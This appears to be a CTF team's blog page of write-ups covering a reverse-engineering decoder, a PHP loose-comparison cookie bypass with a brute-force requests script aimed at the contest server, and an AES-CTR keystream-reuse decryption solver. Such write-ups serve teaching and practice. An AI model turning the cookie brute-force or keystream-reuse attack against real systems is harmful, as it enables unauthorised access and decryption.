+ [&#39; 00401E2F&#39;, &#39;c3 17 83 53 05 e4 d0 53 5f 22 f8 b2 e1 78 09 8d&#39;],
+ [&#39; 00401E48&#39;, &#39;c7 44 24 08 20 00 00 00&#39;],
+ [&#39; 00401E50&#39;, &#39;8b 45 08&#39;],
+ [&#39; 00401E53&#39;, &#39;89 44 24 04&#39;],
+ [&#39; 00401E57&#39;, &#39;8b 45 f4&#39;],
+ [&#39; 00401E5A&#39;, &#39;89 04 24&#39;],
+ [&#39; 00401E5D&#39;, &#39;e8 fa 4f 03 00 d5 23 ab 8a f4 d5 c1 45 2d 51 53&#39;],
+ [&#39; 00436E5C&#39;, &#39;&#39;],
+ [&#39; 00401E62&#39;, &#39;85 c0&#39;],
+ [&#39; 00401E64&#39;, &#39;0f 94 c0&#39;],
+ [&#39; 00401E67&#39;, &#39;c9&#39;],
+ [&#39; 00401E68&#39;, &#39;c3 17 83 53 05 e4 b0 53 a0 f2 d4 b2 e1 78 ac 09&#39;],
+ [&#39; 00401EA6&#39;, &#39;88 45 f7&#39;],
+ [&#39; 00401EA9&#39;, &#39;80 7d f7 00&#39;],
+ [&#39; 00401EAD&#39;, &#39;74 0e 8f a5 06 6c 85 6b 88 3c 29 b3 85 58 ff 3d&#39;],
+ [&#39; 00401EBD&#39;, &#39;c7 04 24 80 a1 43 00&#39;],
+ [&#39; 00401EC4&#39;, &#39;e8 7b 4f 03 00&#39;],
+ [&#39; 00401EC9&#39;, &#39;b8 00 00 00 00&#39;],
+ [&#39; 00401ECE&#39;, &#39;c9&#39;],
+ [&#39; 00401ECF&#39;, &#39;c3 5d 01 07 bd 3d 46 4c 55 bd d8 4f cc 7a 76 83&#39;]]
+
+ go_patch(patch)
+</code></pre>
+<p>Now we can understand the control flow of the encoded binary.
+Anyway, reverse the operation to get the flag</p>
+<pre><code class="language-python" metastring="flag.py">def de_shuffle( decode ):
+    s = map(ord,list(&quot;I am tired of Earth, these people. I&#39;m tired of being caught in the tangle of their lives.&quot;))
+    num = []
+    t =[]
+    for i in range(32):
+        num.append(i)
+        t.append(decode[i])
+    for j in range(len(s)):
+        temp = num[j%32]
+        num[j%32] = num[s[j]&amp;0x1f]
+        num[s[j]&amp;0x1f] = temp
+    for k in range(32):
+        t[num[k]] = decode[k]
+    return t
+
+
+def de_xor( decode ):
+    s = map(ord,list(&quot;October 12th, 1985. Tonight, a comedian died in New York&quot;))
+    for i in range(32):
+        decode[i] = decode[i]^s[i]
+    return decode
+def de_shift(decode):
+    ret = [0]*len(decode)
+    for i in range(len(decode)):
+        num = decode[i]
+        n_1 = num &gt;&gt; 4
+        n = num &amp; 0b1111
+        ret[i] |= n &lt;&lt; 4
+        ret[(i+1)%len(ret)] |= n_1
+    return ret
+
+final = [232, 244, 218, 241, 21, 198, 184, 189, 119, 140, 193, 249, 116, 70, 120, 186, 209, 78, 188, 58, 243, 109, 169, 97, 68, 97, 101, 19, 109, 61, 206, 123]
+for i in range(16):
+    final = de_shuffle(final)
+    final = de_shift(final)
+    final = de_xor(final)
+</code></pre>
+<h1 id="webmy-admin-panel">Web::My admin panel</h1>
+<h2 id="tldr-1">TL;DR</h2>
+<p>Set the value of <code>otadmin</code> in cookie to <code>{&quot;hash&quot;: 389}</code></p>
+<p>flag:<code>p4{wtf_php_comparisons_how_do_they_work}</code></p>
+<h2 id="source-code">source code</h2>
+<pre><code class="language-php" metastring="login.php.bk">&lt;?php
+
+include &#39;../func.php&#39;;
+include &#39;../config.php&#39;;
+
+if (!$_COOKIE[&#39;otadmin&#39;]) {
+    exit(&quot;Not authenticated.\n&quot;);
+}
+
+if (!preg_match(&#39;/^{&quot;hash&quot;: [0-9A-Z\&quot;]+}$/&#39;, $_COOKIE[&#39;otadmin&#39;])) {
+    echo &quot;COOKIE TAMPERING xD IM A SECURITY EXPERT\n&quot;;
+    exit();
+}
+
+$session_data = json_decode($_COOKIE[&#39;otadmin&#39;], true);
+
+if ($session_data === NULL) { echo &quot;COOKIE TAMPERING xD IM A SECURITY EXPERT\n&quot;; exit(); }
+
+if ($session_data[&#39;hash&#39;] != strtoupper(MD5($cfg_pass))) {
+    echo(&quot;I CAN EVEN GIVE YOU A HINT XD \n&quot;);
+    for ($i = 0; i &lt; strlen(MD5(&#39;xDdddddd&#39;)); i++) {
+        echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0);
+    }
+    // this if branch would print out &quot;I CAN EVEN GIVE YOU A HINT XD 0006464640640064000646464640006400640640646400&quot;
+
+    exit(&quot;\n&quot;);
+}
+
+display_admin();
+</code></pre>
+<h2 id="details-3">details</h2>
+<p>The result of md5 (128-bit) would be represented as a sequence of 32 hexadecimal digits. So the meaning of hint is that 0 and 64 are the result of <code>ord(digits)&amp;0xc0</code> and <code>ord(letters)&amp;0xc0</code> respectively.</p>
+<p>Then, the <code>$session_data[&#39;hash&#39;] != strtoupper(MD5($cfg_pass))</code> is the key point, this is loose comparison. All we need to do is brute force the first three digits to pass this check.</p>
+<pre><code class="language-py" metastring="solve.py">import requests
+url = &quot;https://gameserver.zajebistyc.tf/admin/login.php&quot;
+
+for i in range(100,1000):
+    content = requests.get(url,cookies={&#39;otadmin&#39;:f&#39;{{&quot;hash&quot;: {i}}}&#39;}).content
+    if b&#39;p4&#39; in content:
+        print(content,f&quot;hash = {i}&quot;)
+        break
+
+b&#39;Congratulations! p4{wtf_php_comparisons_how_do_they_work}\n&#39; hash = 389
+</code></pre>
+<p>flag
+<code>p4{wtf_php_comparisons_how_do_they_work}</code></p>
+<h1 id="cryptocount-me-in">Crypto::Count me in!</h1>
+<h2 id="tldr-2">TL;DR</h2>
+<p>There is a bug inside the <code>worker_function</code> due to share a global variable among multiple workers, which causes that different workers use the same keystream to encrypt the plaintext.</p>
+<h2 id="details-4">details</h2>
+<p>The bug is inside the <code>worker_function</code>. For example, in this scenario, the <code>woker_0</code> is processing <code>key_stream = aes.encrypt(pad(str(counter)))</code>, the counter is still <code>0</code>, because the <code>counter += 1</code> is not executed yet,  what if the <code>worker_1</code> is processing <code>key_stream = aes.encrypt(pad(str(counter)))</code> at the same time ? They are using the same keystream !</p>
+<pre><code class="language-py" metastring="count.py">...
+
+def worker_function(block):
+    global counter
+    key_stream = aes.encrypt(pad(str(counter)))
+    result = xor_string(block, key_stream)
+    counter += 1
+    return result
+
+...
+</code></pre>
+<p>Find possible keys to decrypt flag:</p>
+<pre><code class="language-py" metastring="solver.py">from libnum import *
+import string
+
+cipher = open(&quot;output.txt&quot;,&quot;r&quot;).read()
+cipher = [ cipher[i:i+32] for i in range(0,len(cipher),32)] ## slice cipher by a chunk size (16byte)
+
+plaintext = &quot;&quot;&quot;The Song of the Count
+
+You know that I am called the Count
+Because I really love to count
+I could sit and count all day
+Sometimes I get carried away
+I count slowly, slowly, slowly getting faster
+Once I&#39;ve started counting it&#39;s really hard to stop
+Faster, faster. It is so exciting!
+I could count forever, count until I drop
+1! 2! 3! 4!
+1-2-3-4, 1-2-3-4,
+1-2, i love couning whatever the ammount haha!
+1-2-3-4, heyyayayay heyayayay that&#39;s the sound of the count
+I count the spiders on the wall...
+I count the cobwebs in the hall...
+I count the candles on the shelf...
+When I&#39;m alone, I count myself!
+I count slowly, slowly, slowly getting faster
+Once I&#39;ve started counting it&#39;s really hard to stop
+Faster, faster. It is so exciting!
+I could count forever, count until I drop
+1! 2! 3! 4!
+1-2-3-4, 1-2-3-4, 1,
+2 I love counting whatever the
+ammount! 1-2-3-4 heyayayay heayayay 1-2-3-4
+That&#39;s the song of the Count!&quot;&quot;&quot;
+
+key = []
+for i in range(len(plaintext)/16):
+    key.append(int(cipher[i],16)^s2n(plaintext[i*16:i*16+16]))
+
+unpad = lambda s : s if ord(s[-1]) &gt; 16 else s[0:-ord(s[-1])]
+
+flag = &quot;&quot;
+for i in range(len(plaintext)/16+1,len(cipher)):
+     for j in key:
+         s = unpad(n2s(int(cipher[i],16)^j))
+         if all( c in string.printable for c in s):
+            flag += s
+
+print flag
+# p4{at_the_end_of_the_day_you_can_only_count_on_yourself}
+</code></pre>
+<p>Flag:
+<code>p4{at_the_end_of_the_day_you_can_only_count_on_yourself}</code></p>
+<h1 id="misc">Misc</h1><style>
+mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+  min-height: 1px;
+  min-width: 1px;
+}
+
+mjx-container[jax="SVG"] > svg a {
+  fill: blue;
+  stroke: blue;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][display="true"][width="full"] {
+  display: flex;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line], svg[data-table] > g > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame], svg[data-table] > g > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed, svg[data-table] > g > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted, svg[data-table] > g > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > g > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"] path[data-c], mjx-container[jax="SVG"] use[data-c] {
+  stroke-width: 3;
+}
+</style> </article> </div> <aside class="article-outline-hud" data-augmented-ui="tl-clip tr-clip br-clip bl-clip border"> <div class="article-outline-hud-content glitchable"> <h2>文章大綱</h2> <nav> <ul> <li> <a href="#reverseelementary">Reverse::Elementary</a> </li><li> <a href="#tldr">TL;DR</a> </li><li> <a href="#details">details</a> </li><li> <a href="#reverseold-school">Reverse::Old school</a> </li><li> <a href="#pseudo-code">pseudo code</a> </li><li> <a href="#details-1">details</a> </li><li> <a href="#reversepudliszki">Reverse::Pudliszki</a> </li><li> <a href="#details-2">details</a> </li><li> <a href="#reversewatchmem">Reverse::Watchmem</a> </li><li> <a href="#webmy-admin-panel">Web::My admin panel</a> </li><li> <a href="#tldr-1">TL;DR</a> </li><li> <a href="#source-code">source code</a> </li><li> <a href="#details-3">details</a> </li><li> <a href="#cryptocount-me-in">Crypto::Count me in!</a> </li><li> <a href="#tldr-2">TL;DR</a> </li><li> <a href="#details-4">details</a> </li><li> <a href="#misc">Misc</a> </li> </ul> </nav> </div> </aside> </div> <div id="persistent-notes-overlay"></div> <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const highlightElements = document.querySelectorAll('.persistent-highlight');
+            const notesOverlay = document.getElementById('persistent-notes-overlay');
+            const containerElement = document.querySelector('.container');
+
+            const positionNotes = () => {
+                notesOverlay.innerHTML = ''; 
+                if (!containerElement) return; 
+
+                
+                if (window.innerWidth > 1024) {
+                    const containerRect = containerElement.getBoundingClientRect();
+                    const noteWidth = 220; 
+                    const margin = 60; 
+
+                    highlightElements.forEach(highlightEl => {
+                        const noteId = highlightEl.dataset.noteId;
+                        const noteText = highlightEl.dataset.noteText; 
+
+                        const rect = highlightEl.getBoundingClientRect();
+
+                        const noteDiv = document.createElement('div');
+                        noteDiv.className = 'persistent-note-item';
+                        noteDiv.setAttribute('data-note-id', noteId);
+                        noteDiv.innerHTML = `<p>${noteText}</p>`;
+
+                        
+                        noteDiv.style.position = 'absolute'; 
+                        noteDiv.style.top = `${rect.top}px`; 
+                        noteDiv.style.left = `${containerRect.left - noteWidth - margin}px`; 
+                        noteDiv.style.width = `${noteWidth}px`;
+
+                        notesOverlay.appendChild(noteDiv);
+
+                        
+                        highlightEl.addEventListener('mouseenter', () => {
+                            noteDiv.classList.add('sci-fi-active');
+                        });
+                        highlightEl.addEventListener('mouseleave', () => {
+                            noteDiv.classList.remove('sci-fi-active');
+                        });
+
+                        
+                        noteDiv.addEventListener('mouseenter', () => {
+                            highlightEl.classList.add('highlight-active');
+                        });
+                        noteDiv.addEventListener('mouseleave', () => {
+                            highlightEl.classList.remove('highlight-active');
+                        });
+                    });
+                }
+            };
+
+            
+            positionNotes();
+
+            
+            window.addEventListener('scroll', positionNotes);
+            window.addEventListener('resize', positionNotes);
+        });
+    </script> <style>
+        
+        .post-content img {
+            max-width: 100%;
+            height: auto;
+            display: block; 
+            margin: 0 auto; 
+        }
+
+        
+
+        #persistent-notes-overlay {
+            position: fixed; 
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none; 
+            z-index: 5; 
+        }
+
+        @media (max-width: 1200px) {
+            #persistent-notes-overlay {
+                display: none; 
+            }
+        }
+
+        .persistent-note-item {
+            pointer-events: auto; 
+            
+        }
+    </style>  <svg xmlns="http://www.w3.org/2000/svg" version="1.1" style="position: absolute; top: -9999px; left: -9999px;"> <defs> <filter id="dist-01"> <feTurbulence id="turbulence" baseFrequency="0.02" numOctaves="8" result="noise" seed="0"></feTurbulence> <feConvolveMatrix in="noise" order="3" result="snoise" kernelMatrix="
+						0  -1   0
+						-1   5  -1
+						0  -1   0    
+					"></feConvolveMatrix> <feDisplacementMap id="displacement" in="SourceGraphic" in2="snoise" scale="6"></feDisplacementMap> </filter> <filter id="dist-02"> <feTurbulence id="turbulence" baseFrequency="0.2" numOctaves="8" result="noise" seed="1"></feTurbulence> <feConvolveMatrix in="noise" order="3" result="snoise" kernelMatrix="
+						0  -1   0
+						-1   5  -1
+						0  -1   0    
+					"></feConvolveMatrix> <feDisplacementMap id="displacement" in="SourceGraphic" in2="snoise" scale="6"></feDisplacementMap> </filter> <filter id="dist-03"> <feTurbulence id="turbulence" baseFrequency="0.01" numOctaves="6" result="noise" seed="2"></feTurbulence> <feConvolveMatrix in="noise" order="3" result="snoise" kernelMatrix="
+						0  -1   0
+						-1   5  -1
+						0  -1   0    
+					"></feConvolveMatrix> <feDisplacementMap id="displacement" in="SourceGraphic" in2="snoise" scale="6"></feDisplacementMap> </filter> <filter id="dist-04"> <feTurbulence id="turbulence" baseFrequency="0.01" numOctaves="6" result="noise" seed="2" type="fractalNoise"></feTurbulence> <feDisplacementMap id="displacement" in="SourceGraphic" in2="noise" scale="6"></feDisplacementMap> </filter> <!-- Additional Glitch Filters for more variety --> <filter id="dist-05"> <feTurbulence baseFrequency="0.05" numOctaves="4" result="noise" seed="3"></feTurbulence> <feDisplacementMap in="SourceGraphic" in2="noise" scale="10"></feDisplacementMap> </filter> <filter id="dist-06"> <feTurbulence baseFrequency="0.1" numOctaves="2" result="noise" seed="4"></feTurbulence> <feDisplacementMap in="SourceGraphic" in2="noise" scale="8"></feDisplacementMap> </filter> <filter id="dist-07"> <feTurbulence baseFrequency="0.03" numOctaves="6" result="noise" seed="5" type="fractalNoise"></feTurbulence> <feDisplacementMap in="SourceGraphic" in2="noise" scale="12"></feDisplacementMap> </filter> <filter id="dist-08"> <feTurbulence baseFrequency="0.08" numOctaves="3" result="noise" seed="6"></feTurbulence> <feDisplacementMap in="SourceGraphic" in2="noise" scale="5"></feDisplacementMap> </filter> </defs> </svg> <script>
+            document.addEventListener('DOMContentLoaded', () => {
+                const glitchableElements = document.querySelectorAll('.glitchable');
+                const filters = ['dist-01', 'dist-02', 'dist-03', 'dist-04', 'dist-05', 'dist-06', 'dist-07', 'dist-08'];
+
+                glitchableElements.forEach(el => {
+                    function applyGlitch() {
+                        const randomFilterId = filters[Math.floor(Math.random() * filters.length)];
+                        const glitchDuration = 0.08//Math.random() * (0.1 - 0.05) + 0.05; // Glitch lasts between 0.05 and 0.1 seconds
+                        const delayBeforeNextGlitch = Math.random() * (6 - 3) + 3; // Next glitch in 0.5 to 2 seconds
+
+                        el.style.filter = `url(#${randomFilterId})`;
+
+                        setTimeout(() => {
+                            el.style.filter = 'none';
+                            setTimeout(applyGlitch, delayBeforeNextGlitch * 1000);
+                        }, glitchDuration * 1000);
+                    }
+
+                    // Initial glitch after a random delay
+                    setTimeout(applyGlitch, Math.random() * 3000); // Initial delay up to 3 seconds
+                });
+
+                // Theme switching logic
+                const themeToggleBtn = document.getElementById('theme-toggle');
+                const body = document.body;
+
+                function toggleTheme() {
+                    if (body.classList.contains('theme-red')) {
+                        body.classList.remove('theme-red');
+                        body.classList.add('theme-purple');
+                        localStorage.setItem('theme', 'theme-purple');
+                    } else if (body.classList.contains('theme-purple')) {
+                        body.classList.remove('theme-purple');
+                        body.classList.add('theme-blue');
+                        localStorage.setItem('theme', 'theme-blue');
+                    } else if (body.classList.contains('theme-blue')) {
+                        body.classList.remove('theme-blue');
+                        body.classList.add('theme-light');
+                        localStorage.setItem('theme', 'theme-light');
+                    } else {
+                        body.classList.remove('theme-light');
+                        body.classList.add('theme-red');
+                        localStorage.setItem('theme', 'theme-red');
+                    }
+                }
+
+                if (themeToggleBtn) {
+                    themeToggleBtn.addEventListener('click', toggleTheme);
+                }
+            });
+        </script> <script type="module">document.addEventListener("DOMContentLoaded",function(){document.querySelectorAll(".persistent-highlight").forEach(t=>{const s=t.dataset.noteId,o=t.dataset.noteText;if(!t||!s||!o)return;let e=null;e=document.createElement("div"),e.className="persistent-note-block",e.dataset.noteId=s,e.innerHTML=`<p>${o}</p>`;let n=t.closest("p");if(n===null){let a=t;for(;a&&a.nextElementSibling;)if(a=a.nextElementSibling,a.tagName==="P"){n=a;break}}n&&n.parentNode&&n.parentNode.insertBefore(e,n.nextSibling),t.addEventListener("mouseenter",()=>{e.classList.add("glow-active")}),t.addEventListener("mouseleave",()=>{e.classList.remove("glow-active")}),e.addEventListener("mouseenter",()=>{t.classList.add("highlight-active"),e.classList.add("glow-active")}),e.addEventListener("mouseleave",()=>{t.classList.remove("highlight-active"),e.classList.remove("glow-active")})})});</script> </body> </html>
